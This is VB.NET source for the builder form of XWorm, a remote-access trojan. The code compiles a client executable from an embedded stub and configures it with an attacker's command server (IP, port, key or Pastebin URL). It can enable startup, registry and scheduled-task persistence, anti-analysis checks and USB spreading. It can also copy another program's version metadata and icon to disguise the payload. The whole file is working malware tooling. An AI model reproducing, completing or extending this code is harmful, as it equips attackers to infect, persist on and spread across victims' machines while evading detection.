
Imports System.CodeDom.Compiler
Imports System.Text
Imports Microsoft.VisualBasic.CompilerServices

Public Class Builder

    Public iconpath As String
    Public assm As String
    Private Sub Builder_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Try



            If My.Computer.Registry.GetValue("HKEY_CURRENT_USER\SOFTWARE\XWorm", "Assembly", Nothing) = Nothing Or My.Computer.Registry.GetValue("HKEY_CURRENT_USER\SOFTWARE\XWorm", "Assembly", Nothing) = "False" Then
                assm = Nothing
                CheckBox8.Checked = False
            Else
                assm = My.Computer.Registry.GetValue("HKEY_CURRENT_USER\SOFTWARE\XWorm", "Assembly", Nothing)
                CheckBox8.Checked = True
            End If



            If My.Computer.Registry.GetValue("HKEY_CURRENT_USER\SOFTWARE\XWorm", "Icon", Nothing) = Nothing Or My.Computer.Registry.GetValue("HKEY_CURRENT_USER\SOFTWARE\XWorm", "Icon", Nothing) = "False" Then
                iconpath = Nothing
                CheckBox3.Checked = False
                PictureBox1.Image = Nothing
            Else
                iconpath = My.Computer.Registry.GetValue("HKEY_CURRENT_USER\SOFTWARE\XWorm", "Icon", Nothing)
                CheckBox3.Checked = True
                PictureBox1.ImageLocation = (iconpath)
            End If

            If My.Computer.Registry.GetValue("HKEY_CURRENT_USER\SOFTWARE\XWorm", "Startup", Nothing) = "True" Then
                CheckBox1.Checked = True

            Else
                CheckBox1.Checked = False

            End If


            If My.Computer.Registry.GetValue("HKEY_CURRENT_USER\SOFTWARE\XWorm", "Reg", Nothing) = "True" Then
                CheckBox2.Checked = True
            Else
                CheckBox2.Checked = False
            End If


            If My.Computer.Registry.GetValue("HKEY_CURRENT_USER\SOFTWARE\XWorm", "Task", Nothing) = "True" Then
                CheckBox5.Checked = True
            Else
                CheckBox5.Checked = False
            End If


            If My.Computer.Registry.GetValue("HKEY_CURRENT_USER\SOFTWARE\XWorm", "Analysis", Nothing) = "True" Then
                CheckBox6.Checked = True
            Else
                CheckBox6.Checked = False
            End If



            If My.Computer.Registry.GetValue("HKEY_CURRENT_USER\SOFTWARE\XWorm", "Host", Nothing) = Nothing Then
                TextBox1.Text = "127.0.0.1"
            Else
                TextBox1.Text = My.Computer.Registry.GetValue("HKEY_CURRENT_USER\SOFTWARE\XWorm", "Host", Nothing)
            End If



            If My.Computer.Registry.GetValue("HKEY_CURRENT_USER\SOFTWARE\XWorm", "Port", Nothing) = Nothing Then
                TextBox2.Text = "7000"
            Else
                TextBox2.Text = My.Computer.Registry.GetValue("HKEY_CURRENT_USER\SOFTWARE\XWorm", "Port", Nothing)
            End If


            If My.Computer.Registry.GetValue("HKEY_CURRENT_USER\SOFTWARE\XWorm", "Key", Nothing) = Nothing Then
                TextBox5.Text = "<123456789>"
            Else
                TextBox5.Text = My.Computer.Registry.GetValue("HKEY_CURRENT_USER\SOFTWARE\XWorm", "Key", Nothing)
            End If







            If My.Computer.Registry.GetValue("HKEY_CURRENT_USER\SOFTWARE\XWorm", "Url", Nothing) = Nothing Then
                TextBox4.Text = "https://pastebin.com/raw/IP:PORT"
            Else
                TextBox4.Text = My.Computer.Registry.GetValue("HKEY_CURRENT_USER\SOFTWARE\XWorm", "Url", Nothing)
            End If

            If My.Computer.Registry.GetValue("HKEY_CURRENT_USER\SOFTWARE\XWorm", "Pastebin", Nothing) = "True" Then
                TextBox1.Enabled = False
                TextBox2.Enabled = False
                TextBox5.Enabled = False
                CheckBox4.Checked = True
                TextBox4.Enabled = True
            Else
                TextBox1.Enabled = True
                TextBox2.Enabled = True
                TextBox5.Enabled = True
                CheckBox4.Checked = False
                TextBox4.Enabled = False
            End If
        Catch ex As Exception

        End Try






        If My.Computer.Registry.GetValue("HKEY_CURRENT_USER\SOFTWARE\XWorm", "USBN", Nothing) = Nothing Then
            TextBox3.Text = "USB.exe"
        Else
            TextBox3.Text = My.Computer.Registry.GetValue("HKEY_CURRENT_USER\SOFTWARE\XWorm", "USBN", Nothing)
        End If

        If My.Computer.Registry.GetValue("HKEY_CURRENT_USER\SOFTWARE\XWorm", "USBE", Nothing) = "True" Then
            CheckBox7.Checked = True
            TextBox3.Enabled = True
        Else
            CheckBox7.Checked = False
            TextBox3.Enabled = False
        End If




    End Sub

    Private Sub CheckBox3_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox3.CheckedChanged

    End Sub

    Private Sub Button1_Click_1(sender As Object, e As EventArgs) Handles Button1.Click


        Try
            Dim saveFileDialog As SaveFileDialog = New SaveFileDialog With {
       .Filter = "(*.exe)|*.exe",
       .OverwritePrompt = False,
       .FileName = "XWormClient.exe"
         }

            If saveFileDialog.ShowDialog() = DialogResult.OK Then
                Try
                    My.Computer.Registry.SetValue("HKEY_CURRENT_USER\SOFTWARE\XWorm",
"Host", TextBox1.Text)
                    My.Computer.Registry.SetValue("HKEY_CURRENT_USER\SOFTWARE\XWorm",
"Port", TextBox2.Text)
                    My.Computer.Registry.SetValue("HKEY_CURRENT_USER\SOFTWARE\XWorm",
"Key", TextBox5.Text)
                    My.Computer.Registry.SetValue("HKEY_CURRENT_USER\SOFTWARE\XWorm",
"USBN", TextBox3.Text)
                    My.Computer.Registry.SetValue("HKEY_CURRENT_USER\SOFTWARE\XWorm",
"Url", TextBox4.Text)
                Catch ex As Exception
                End Try


                Try
                    If CheckBox1.Checked = True Then
                        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\SOFTWARE\XWorm",
"Startup", "True")
                    Else
                        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\SOFTWARE\XWorm",
"Startup", "False")
                    End If



                    If CheckBox2.Checked = True Then
                        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\SOFTWARE\XWorm",
"Reg", "True")
                    Else
                        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\SOFTWARE\XWorm",
"Reg", "False")
                    End If


                    If CheckBox5.Checked = True Then
                        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\SOFTWARE\XWorm",
"Task", "True")
                    Else
                        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\SOFTWARE\XWorm",
"Task", "False")
                    End If
                    Helper.aes_function()
                    If CheckBox6.Checked = True Then
                        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\SOFTWARE\XWorm",
"Analysis", "True")
                    Else
                        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\SOFTWARE\XWorm",
"Analysis", "False")
                    End If

                    If CheckBox7.Checked = True Then
                        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\SOFTWARE\XWorm",
"USBE", "True")
                    Else
                        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\SOFTWARE\XWorm",
"USBE", "False")
                    End If






                    If assm = Nothing Then
                        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\SOFTWARE\XWorm",
"Assembly", "False")
                    Else
                        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\SOFTWARE\XWorm",
"Assembly", assm)
                    End If





                    If iconpath = Nothing Then
                        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\SOFTWARE\XWorm",
"Icon", "False")
                    Else
                        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\SOFTWARE\XWorm",
"Icon", iconpath)
                    End If





                    If CheckBox4.Checked = True Then
                        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\SOFTWARE\XWorm",
"Pastebin", "True")
                    Else
                        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\SOFTWARE\XWorm",
"Pastebin", "False")
                    End If

                Catch ex As Exception
                End Try

                Dim Source = My.Resources.Stub
                Dim validchars As String = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
                Dim sb As New StringBuilder()
                Dim rand As New Random()
                For i As Integer = 1 To 16
                    Dim idx As Integer = rand.Next(0, validchars.Length)
                    Dim randomChar As Char = validchars(idx)
                    sb.Append(randomChar)
                Next i

                Dim randomString = sb.ToString()
                Source = Source.Replace("%mtx%", randomString)
                Source = Source.Replace("%usb%", TextBox3.Text)

                If CheckBox4.Checked = True Then
                    Source = Replace(Source, "#Const Pastebin = False", "#Const Pastebin = True")
                    Source = Source.Replace("%PasteUrl%", TextBox4.Text)
                Else
                    Source = Source.Replace("%ip%", TextBox1.Text)
                    Source = Source.Replace("%port%", TextBox2.Text)
                End If

                Source = Source.Replace("%key%", TextBox5.Text)

                If CheckBox7.Checked = True Then
                    Source = Replace(Source, "#Const usbSP = False", "#Const usbSP = True")
                End If

                If CheckBox1.Checked = True Then
                    Source = Replace(Source, "#Const startup = False", "#Const startup = True")
                End If

                If CheckBox5.Checked = True Then
                    Source = Replace(Source, "#Const task = False", "#Const task = True")
                End If

                If CheckBox2.Checked = True Then
                    Source = Replace(Source, "#Const reg = False", "#Const reg = True")
                End If

                If CheckBox6.Checked = True Then
                    Source = Replace(Source, "#Const Analysis = False", "#Const Analysis = True")
                End If



                If CheckBox8.Checked Then
                    Dim info As FileVersionInfo = FileVersionInfo.GetVersionInfo(assm)


                    Source = Replace(Source, "%Title%", info.FileDescription)
                    Source = Replace(Source, "%Des%", info.Comments)
                    Source = Replace(Source, "%Company%", info.CompanyName)
                    Source = Replace(Source, "%Product%", info.ProductName)
                    Source = Replace(Source, "%Copyright%", info.LegalCopyright)
                    Source = Replace(Source, "%Trademark%", info.LegalTrademarks)
                    Source = Replace(Source, "%Guid%", Guid.NewGuid.ToString)


                    Source = Source.Replace("%v1%", info.FileMajorPart.ToString())
                    Source = Source.Replace("%v2%", info.FileMinorPart.ToString())
                    Source = Source.Replace("%v3%", info.FileBuildPart.ToString())
                    Source = Source.Replace("%v4%", info.FilePrivatePart.ToString())

                Else

                    Source = Replace(Source, "%Title%", Nothing)
                    Source = Replace(Source, "%Des%", Nothing)
                    Source = Replace(Source, "%Company%", Nothing)
                    Source = Replace(Source, "%Product%", Nothing)
                    Source = Replace(Source, "%Copyright%", Nothing)
                    Source = Replace(Source, "%Trademark%", Nothing)
                    Source = Replace(Source, "%Guid%", Guid.NewGuid.ToString)


                    Source = Source.Replace("%v1%", 1)
                    Source = Source.Replace("%v2%", 0)
                    Source = Source.Replace("%v3%", 0)
                    Source = Source.Replace("%v4%", 0)
                End If

                Compiler(saveFileDialog.FileName, Source)
            End If
        Catch ex As Exception
        End Try
    End Sub
    Public OK As Boolean = False
    Public Sub Compiler(ByVal Path As String, ByVal Code As String)
        Try
            Dim providerOptions = New Collections.Generic.Dictionary(Of String, String)
            providerOptions.Add("CompilerVersion", "v4.0")
            Dim CodeProvider As New Microsoft.VisualBasic.VBCodeProvider(providerOptions)
            Dim Parameters As New CompilerParameters
            Dim OP As String = " /target:winexe /platform:anycpu /nowarn"
            With Parameters
                .GenerateExecutable = True
                .OutputAssembly = Path
                .CompilerOptions = OP
                .IncludeDebugInformation = False
                .ReferencedAssemblies.Add("System.Windows.Forms.dll")
                .ReferencedAssemblies.Add("System.dll")
                .ReferencedAssemblies.Add("Microsoft.VisualBasic.dll")
                .ReferencedAssemblies.Add("System.Management.dll")
                .ReferencedAssemblies.Add("System.Drawing.dll")
                Dim Results = CodeProvider.CompileAssemblyFromSource(Parameters, Code)
                If Results.Errors.Count > 0 Then
                    For Each E In Results.Errors
                        MsgBox(E.ErrorText, MsgBoxStyle.Critical)
                    Next
                    OK = False
                End If
            End With
            Try
                If CheckBox3.Checked = True Then
                    Threading.Thread.Sleep(1500)
                    IconInjector.InjectIcon(Path, iconpath)
                End If
            Catch ex As Exception
            End Try
            GC.Collect()
            MessageBox.Show(Path, "DONE!")
            Me.Hide()
        Catch ex As Exception
            MessageBox.Show(ex.Message)
        End Try
    End Sub
    Private Sub TextBox2_TextChanged(sender As Object, e As EventArgs) Handles TextBox2.TextChanged
        Try
            Dim num As Integer = Conversions.ToInteger(Me.TextBox2.Text)
            If ((Conversions.ToInteger(Me.TextBox2.Text) > &HFFFE) Or (Conversions.ToInteger(Me.TextBox2.Text) < 1)) Then
                Me.Button1.Enabled = False
            Else
                Me.Button1.Enabled = True
            End If
        Catch exception1 As Exception
            Me.Button1.Enabled = False
        End Try
    End Sub


    Private Sub CheckBox7_MouseClick(sender As Object, e As MouseEventArgs) Handles CheckBox7.MouseClick
        If CheckBox7.Checked = True Then
            TextBox3.Enabled = True
        Else
            TextBox3.Enabled = False
        End If
    End Sub

    Private Sub CheckBox4_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox4.CheckedChanged

    End Sub

    Private Sub CheckBox4_MouseClick(sender As Object, e As MouseEventArgs) Handles CheckBox4.MouseClick
        If CheckBox4.Checked = True Then
            TextBox1.Enabled = False
            TextBox2.Enabled = False
            TextBox5.Enabled = False

            TextBox4.Enabled = True
        Else
            TextBox1.Enabled = True
            TextBox2.Enabled = True
            TextBox5.Enabled = True

            TextBox4.Enabled = False
        End If
    End Sub

    Private Sub TextBox5_TextChanged(sender As Object, e As EventArgs) Handles TextBox5.TextChanged
        Try
            If Me.TextBox5.Text.Length > 32 Or ((Me.TextBox5.Text.Length) < 1) Then
                Me.Button1.Enabled = False
            Else
                Me.Button1.Enabled = True
            End If
        Catch ex As Exception
            Me.Button1.Enabled = False
        End Try
    End Sub

    Private Sub CheckBox8_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox8.CheckedChanged

    End Sub

    Private Sub CheckBox3_MouseClick(sender As Object, e As MouseEventArgs) Handles CheckBox3.MouseClick
        If CheckBox3.Checked = True Then
            Dim OfD As New OpenFileDialog
            With OfD
                .Title = "Select Icon"
                .Filter = "Icons Files(*.exe;*.ico;)|*.exe;*.ico"
                .InitialDirectory = Application.StartupPath & "\Icons"
                If OfD.ShowDialog() = DialogResult.OK Then
                    If OfD.FileName.EndsWith(".exe") Then
                        iconpath = EXEICO.GetIcon(OfD.FileName)
                        PictureBox1.ImageLocation = (iconpath)
                        GC.Collect()
                    Else
                        iconpath = OfD.FileName
                        PictureBox1.ImageLocation = (iconpath)
                    End If

                Else
                    iconpath = Nothing
                    PictureBox1.Image = Nothing
                    CheckBox3.Checked = False
                End If

            End With


        End If
        If CheckBox3.Checked = False Then
            iconpath = Nothing
            PictureBox1.Image = Nothing
            CheckBox3.Checked = False
        End If
    End Sub

    Private Sub CheckBox8_MouseClick(sender As Object, e As MouseEventArgs) Handles CheckBox8.MouseClick
        If CheckBox8.Checked = True Then
            Dim OfD As New OpenFileDialog
            With OfD
                .Title = "Select Exe File"
                .Filter = "(*.exe|*.exe"
                If OfD.ShowDialog() = DialogResult.OK Then
                    assm = OfD.FileName
                    CheckBox8.Checked = True
                Else
                    assm = Nothing
                    CheckBox8.Checked = False
                End If
            End With


        End If
        If CheckBox8.Checked = False Then
            assm = Nothing
            CheckBox8.Checked = False
        End If
    End Sub
End Class